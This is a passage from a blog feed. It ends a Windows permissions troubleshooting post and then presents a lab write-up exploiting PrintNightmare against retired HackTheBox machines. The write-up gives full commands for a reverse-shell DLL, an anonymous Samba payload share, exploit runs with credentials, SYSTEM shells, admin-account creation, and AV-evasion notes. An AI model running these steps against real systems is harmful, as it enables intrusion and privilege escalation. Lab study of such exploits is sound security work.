<p>Again, if you&rsquo;re not sure about this, and didn&rsquo;t want to reinstall your Windows, try install a fresh Windows on Virtual Machine / Cloud and inspect the default permission settings.</p>
<h3 id="stack-based-and-wifi-error">Stack-based and WiFi error</h3>
<p>This section may resolve the following problems.</p>
<ul>
<li>SystemSettings.exe - System Error: The system detected an overrun of a blabla..</li>
<li>Windows won&rsquo;t remember Wi-Fi password</li>
<li>The &ldquo;Forget&rdquo; and &ldquo;Properties&rdquo; options are missing from Wi-Fi connection.</li>
<li>Mobile Hotspot Wi-Fi</li>
</ul>
<p>In my case the root cause of these problems was also the folder permissions.</p>
<p>In Windows, all Wi-Fi profiles are stored in <code>C:\ProgramData\Microsoft\Wlansvc\Profiles</code>, so if the permissions are messed up, the system is most likely to crash or partially working. In my case, my laptop is able to connect to any Wi-Fi network, but it can&rsquo;t remember the Wi-Fi profile, so I have to re-enter my Wi-Fi password every time I want to connect.</p>
<p>But, after reverting the permissions of  the <code>Wlansvc</code> folder , the WiFi functionality/features returned back to normal.</p>
<p><div class="img-container"><img src="imgs/image-20210721055011183.png" alt="image-20210721055011183"  /></div>
</p>
<p>It also fixed the missing options and auto-connect.</p>
<p><div class="img-container"><img src="imgs/image-20210721055107535.png" alt="image-20210721055107535"  /></div>
</p>
<p>Also, there is no more error about &ldquo;<em>The system detected an overrun of a stack-based buffer in this  application. This overrun could potentially allow a malicious user to  gain control of this application</em>&rdquo; on the Wi-Fi settings.</p>
<blockquote>
<p>Padahal cuma mau reinstall Office, merembetnya kemana-mana 🙃.</p>
</blockquote>
<h2 id="conclusion">Conclusion</h2>
<p>That&rsquo;s all! I hope this post helps you too.</p>
<p>I will try to keep this post updated whenever I face the same problem related to Windows Permissions.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--1700-3999-">https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--1700-3999-</a></li>
<li>Myself</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Play with PrintNightmare using HackTheBox machines</title>
      <link>https://fahmifj.github.io/blog/play-with-printnightmare/</link>
      <pubDate>Sat, 17 Jul 2021 13:52:01 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/play-with-printnightmare/</guid>
      <description>Having fun with a Zero-Day vulnerability</description>
      <content:encoded><![CDATA[<p>For the past week, a lot of InfoSec pros I follow on Twitter were <em>tweeting</em> about a remote code execution vulnerability in the Windows Print  Spooler service that could be used for privilege escalation, and furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to the vulnerability, which is now publicly known as PrintNightmare.  This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p>
<p>I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability. In this post, I just want to play with the vulnerability using <a href="http://hackthebox.eu/">HackTheBox</a> <a href="https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021">retired machines</a> as targets.</p>
<p><strong>[Updated 03-03-2021]</strong></p>
<ul>
<li>Update clarity</li>
</ul>
<h2 id="preparation">Preparation</h2>
<p>There are several PoC exploits out there for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>. To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0.  But, changing the currently installed Impacket could potentially mess up my Kali. Therefore, I will use a Python virtual environment using <code>virtualenv</code> module. If I don&rsquo;t have it, I can run the following command to install the module.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ python3 -m pip install virtualenv
</code></pre></div><p>The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba server, and it must be configured to allow anonymous access, so that the exploit can directly grab the DLL .</p>
<p>That said, I have some preparations to do.</p>
<h4 id="working-directory">Working Directory</h4>
<p>The first one is a working directory/folder, which I will create one under <code>/opt</code> called <code>printnightmare</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «opt» «10.10.14.75» 
$ mkdir printnightmare <span class="o">&amp;&amp;</span> <span class="nb">cd</span> printnightmare
</code></pre></div><p>Inside the <code>printnightmare</code> , I will clone the cube0x0 impacket as well as the exploit (<code>CVE-2021-1675-cube0x0</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ git clone https://github.com/cube0x0/impacket <span class="o">&amp;&amp;</span> git clone https://github.com/cube0x0/CVE-2021-1675.git CVE-2021-1675-cube0x0
</code></pre></div><p>Next, I will create a virtual environment called  <code>impacket-venv</code> using <code>virtualenv</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ virtualenv impacket-venv
created virtual environment CPython3.9.2.final.0-64 in 614ms
  creator CPython3Posix<span class="o">(</span><span class="nv">dest</span><span class="o">=</span>/opt/printnightmare/impacket-venv, <span class="nv">clear</span><span class="o">=</span>False, <span class="nv">no_vcs_ignore</span><span class="o">=</span>False, <span class="nv">global</span><span class="o">=</span>False<span class="o">)</span>
  seeder FromAppData<span class="o">(</span><span class="nv">download</span><span class="o">=</span>False, <span class="nv">pip</span><span class="o">=</span>bundle, <span class="nv">setuptools</span><span class="o">=</span>bundle, <span class="nv">wheel</span><span class="o">=</span>bundle, <span class="nv">via</span><span class="o">=</span>copy, <span class="nv">app_data_dir</span><span class="o">=</span>/home/kali/.local/share/virtualenv<span class="o">)</span>
    added seed packages: <span class="nv">pip</span><span class="o">==</span>21.1.3, <span class="nv">setuptools</span><span class="o">==</span>57.1.0, <span class="nv">wheel</span><span class="o">==</span>0.36.2
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
</code></pre></div><p>Then, I will activate the virtual environment with the following commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ <span class="nb">source</span> impacket-venv/bin/activate
</code></pre></div><p>Now I can just install the cube0x0 impacket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ <span class="nb">cd</span> impacket <span class="o">&amp;&amp;</span> python3 setup.py install
running install
running bdist_egg
running egg_info
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="dll-payload">DLL Payload</h4>
<p>Before generating a DLL, I will create a <code>dll</code> folder first under the <code>printnightmare</code> folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ mkdir dll
</code></pre></div><p>I will be using <code>msfvenom</code> to generate the DLL . Upon a successful exploitation, this DLL will connects back to my attacking machine on port 4444, in short, it&rsquo;s a reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «dll» «10.10.14.75» 
$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.75 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; revshell.dll  
<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span class="m">460</span> bytes
Final size of dll file: <span class="m">8704</span> bytes
</code></pre></div><blockquote>
<p>If you want to compile your own, go <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">here</a> or see <a href="#troubleshoot">Troubleshoot</a></p>
</blockquote>
<h4 id="samba-server-configuration">Samba Server Configuration</h4>
<p>In the exploit repo, cube0x0 also provides a guide on how to configure a Samba server for hosting the DLL payload. I will follow cube0x0&rsquo;s guide, but I will add some additional lines for logging to the configuration file.</p>
<p>First, I will create a backup of the original Samba configuration file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.bak<span class="o">}</span>
</code></pre></div><p>Then I will replace the entire <code>smb.conf</code> contents with the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[global]
   server role = standalone server
   smb ports = 445
   map to guest = bad user
   usershare allow guests = yes
   idmap config * : backend = tdb
   log file = /var/log/samba/log.%m
   max log size = 1000
   logging = file
   
[ef]
    comment = Samba
    path = /opt/printnightmare/dll
    guest ok = yes
    read only = no
    browsable = yes
</code></pre></div><p>Lastly, I will start the Samba service.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ sudo systemctl start smbd 
</code></pre></div><h2 id="target-machines">Target Machines</h2>
<p>As stated previously, I will be using HackTheBox retired machines as the targets. Here are the retired Windows machines that I will use along with their low privilege users.</p>
<div class="table-wrapper" >
<table>
<thead>
<tr>
<th style="text-align:center">Target</th>
<th style="text-align:center">IP</th>
<th style="text-align:center">Low Priv Credentials [username:password]</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Active</td>
<td style="text-align:center">10.10.10.100</td>
<td style="text-align:center">svc_tgs:GPPstillStandingStrong2k18</td>
</tr>
<tr>
<td style="text-align:center">Bastion</td>
<td style="text-align:center">10.10.10.134</td>
<td style="text-align:center">l4mpje:bureaulampje</td>
</tr>
<tr>
<td style="text-align:center">Heist</td>
<td style="text-align:center">10.10.10.149</td>
<td style="text-align:center">hazard:stealth1agent</td>
</tr>
<tr>
<td style="text-align:center">Forest</td>
<td style="text-align:center">10.10.10.161</td>
<td style="text-align:center">svc-alfresco:s3rvice</td>
</tr>
<tr>
<td style="text-align:center">Atom</td>
<td style="text-align:center">10.10.10.237</td>
<td style="text-align:center">jason:kidvscat_electron_@123</td>
</tr>
</tbody>
</table>
</div>
<h2 id="target-scanning">Target Scanning</h2>
<p>According to <a href="https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html">this blog post</a> by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:</p>
<ol>
<li>Print Spooler Service enabled on the target system ❔</li>
<li>Network connectivity to the target system (initial access has been obtained)  ✔</li>
<li>Hash or password for a low privileged user (or computer) account  ✔</li>
</ol>
<p>Now to check if the Print Spooler service enabled, I could follow cube0x0&rsquo;s instruction by using a tool from impacket called <code>rpcdump.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ rpcdump.py @<span class="o">[</span>IP-ADDRESS<span class="o">]</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
</code></pre></div><p><code>rpcclient</code> can also be used to detect the availability of Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is <strong>&ldquo;Could not initialise spoolss&rdquo;</strong>, then the Print Spooler is most likely to be disabled.</p>
<p>The following is a dirty bash script I created to do both using <code>rpcdump.py</code> and <code>rpcclient</code> in one run.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
</span><span class="cp"></span>
<span class="nv">targets</span><span class="o">=</span><span class="nv">$1</span>

<span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$targets</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nb">echo</span> <span class="s2">&#34;[-] Usage\t: </span><span class="nv">$0</span><span class="s2"> [Target file]&#34;</span> 
  <span class="nb">echo</span> <span class="s2">&#34;[-] File format : &lt;ip&gt;:&lt;username&gt;:&lt;password&gt; | 127.0.0.1:foo:bar&#34;</span>
  <span class="k">else</span>
	<span class="k">for</span> target in <span class="sb">`</span>cat <span class="nv">$targets</span><span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
		 <span class="nv">ip</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f1<span class="k">)</span>
		 <span class="nv">username</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2<span class="k">)</span>
		 <span class="nv">password</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f3<span class="k">)</span>
		 <span class="nb">echo</span>  <span class="s2">&#34; - [</span><span class="nv">$ip</span><span class="s2">] - &#34;</span> 
		 impacket-rpcdump <span class="nv">$ip</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
		 rpcclient -U <span class="s2">&#34;</span><span class="nv">$username</span><span class="s2">%</span><span class="nv">$password</span><span class="s2">&#34;</span> <span class="nv">$ip</span> -c <span class="s2">&#34;enumprinters;quit&#34;</span>
	<span class="k">done</span>
<span class="k">fi</span>
</code></pre></div><p>I saved the script as <code>detect-nightmare.sh</code> . I ran the script and it returned the following results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ ./detect-nightmare.sh target-machines
 - <span class="o">[</span>10.10.10.100<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
 - <span class="o">[</span>10.10.10.134<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
No printers returned.
 - <span class="o">[</span>10.10.10.149<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
No printers returned.
 - <span class="o">[</span>10.10.10.161<span class="o">]</span> - 
Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
 - <span class="o">[</span>10.10.10.237<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
No printers returned.
</code></pre></div><p>From the results above, Active and Forest don&rsquo;t seem to be vulnerable, but I will still test them out!</p>
<h2 id="exploitation-demo">Exploitation Demo</h2>
<h4 id="101010100-active">[10.10.10.100] Active</h4>
<p>As expected, on Active, the exploit failed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span>@10.10.10.100 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.100<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Connection Failed
</code></pre></div><h4 id="101010134-bastion">[10.10.10.134] Bastion</h4>
<p>I ran the exploit against Bastion, but the DLL got removed by AV 😂.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py Bastion/l4mpje:<span class="s1">&#39;bureaulampje&#39;</span>@10.10.10.134 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.134<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_1734185bdb8f8610<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
...<span class="o">[</span>SNIP<span class="o">]</span>...
impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not <span class="nb">complete</span> successfully because the file contains a virus or potentially unwanted software
</code></pre></div><p>No problem! The conclusion here is that Bastion was vulnerable.</p>
<h4 id="101010134-heist">[10.10.10.134] Heist</h4>
<p>On Heist, the exploit didn&rsquo;t show an indication of a successful exploitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py heist/hazard:<span class="s1">&#39;stealth1agent&#39;</span>@10.10.10.149 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.149<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_83aa9aebf5dffc96<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Try 2...
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
...<span class="o">[</span>SNIP<span class="o">]</span>...
impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
</code></pre></div><p>But strangely, I got a shell in my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ nc -nvlp <span class="m">4444</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.149<span class="o">]</span> <span class="m">49700</span>
Microsoft Windows <span class="o">[</span>Version 10.0.17763.437<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
whoami
nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;hostname
hostname
SupportDesk

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::c138:bcba:454d:8b9c
   Link-local IPv6 Address . . . . . : fe80::c138:bcba:454d:8b9c%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.149
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
                                       10.10.10.2
</code></pre></div><h4 id="101010161-forest">[10.10.10.161] Forest</h4>
<p>Like on Active, the exploit also failed on Forest</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py htb.local/svc-alfresco:<span class="s1">&#39;s3rvice&#39;</span>@10.10.10.161 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.161<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Connection Failed
</code></pre></div><h4 id="101010237-atom">[10.10.10.237] Atom</h4>
<p>On Atom, the exploit returned the same result as on Heist, no indication of a successful exploitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Try 2...
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
...<span class="o">[</span>SNIP<span class="o">]</span>...
impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
</code></pre></div><p>But then the DLL connected to my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ nc -nvlp <span class="m">4444</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">62322</span>
Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
whoami
nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
hostname
ATOM

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::6036:234d:b46e:b7d
   Temporary IPv6 Address. . . . . . : dead:beef::6193:2da2:279d:6fea
   Temporary IPv6 Address. . . . . . : dead:beef::94cf:8412:6dc6:a8ed
   Link-local IPv6 Address . . . . . : fe80::6036:234d:b46e:b7d%6
   IPv4 Address. . . . . . . . . . . : 10.10.10.237
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
                                       10.10.10.2
</code></pre></div><h2 id="troubleshoot">Troubleshoot</h2>
<h4 id="status_pipe_closing">STATUS_PIPE_CLOSING</h4>
<p>I&rsquo;m sure that the following error is caused by my DLL payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)
</code></pre></div><p>This is probably because, instead of using the DLL to create a user (one time load / execution / thread), I use the DLL for reverse shell.</p>
<p><del>I wanted to generate my own payload to test but my Visual Studio somehow didn&rsquo;t want me to install the Windows SDK</del>  (Fixed on <a href="https://fahmifj.github.io/blog/windows-10-troubleshoot-permissions/">this post</a>).</p>
<p>So I stole <a href="https://github.com/fahmifj/PrintNightmare-kit/blob/main/generate-nightmaredll.ps1">this payload</a> from this <a href="https://github.com/calebstewart/CVE-2021-1675">PoC</a> created by Caleb Stewart and John Hammond.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS /opt/PrintNightmare/dll&gt; Import-Module ./generate-nightmaredll.ps1
PS /opt/PrintNightmare/dll&gt; Get-NightmareDLL
<span class="o">[</span>+<span class="o">]</span> Created payload at /opt/printnightmare/dll/nightmare.dll
</code></pre></div><p>I ran the exploit again on Atom, but this time it didn&rsquo;t crash, instead it displayed the proper message of a successful exploitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> ✗ 
$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\nightmare.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\n</span>ightmare.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Try 2...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Stage2: <span class="m">0</span>
<span class="o">[</span>+<span class="o">]</span> Exploit Completed
</code></pre></div><p>Now I can login with credentials of  <code>adm1n:P@ssw0rd</code> (default credentials from the stolen DLL) using <code>evil-winrm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «dll» «10.10.14.75» 
$ evil-winrm -i 10.10.10.237 -u <span class="s1">&#39;adm1n&#39;</span> -p <span class="s1">&#39;P@ssw0rd&#39;</span>                                                       

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; whoami /groups <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;Administrators&#34;</span>

NT AUTHORITY<span class="se">\L</span>ocal account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner


*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
ATOM
</code></pre></div><h4 id="av-evasion">AV Evasion</h4>
<p>Another issue I ran into during the demo was that the payload got removed by Microsoft Defender on Bastion. Using a self compile DLL payload (I should do this earlier 😅🔨) from <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">BookHackTrick</a> DLL templates can resolve this.</p>
<p>The following is the one that I use.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own
